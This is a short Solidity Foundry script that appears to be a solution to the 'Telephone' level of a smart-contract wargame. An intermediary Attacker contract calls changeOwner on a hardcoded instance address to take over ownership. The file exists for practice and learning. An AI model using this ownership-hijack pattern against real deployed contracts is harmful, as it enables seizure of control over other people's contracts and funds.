// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instance/Telephone.sol";
import "forge-std/Script.sol";

contract Attacker {
    Telephone _instance;
    constructor(address _victim) {
        _instance = Telephone(_victim);
    }

    function changeOwner(address _player) public {
        _instance.changeOwner(_player);
    }

    function getOwner() public view returns (address) {
        return _instance.owner();
    }
}

contract Level4 is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker _attacker = new Attacker(0x8aCd85898458400f7Db866d53FCFF6f0D49741FF);
        console.log("Owner: ", _attacker.getOwner());
        _attacker.changeOwner(0x70997970C51812dc3A010C7d01b50e0d17dc79C8);
        console.log("Changed owner: ", _attacker.getOwner());
        vm.stopBroadcast();
    }
}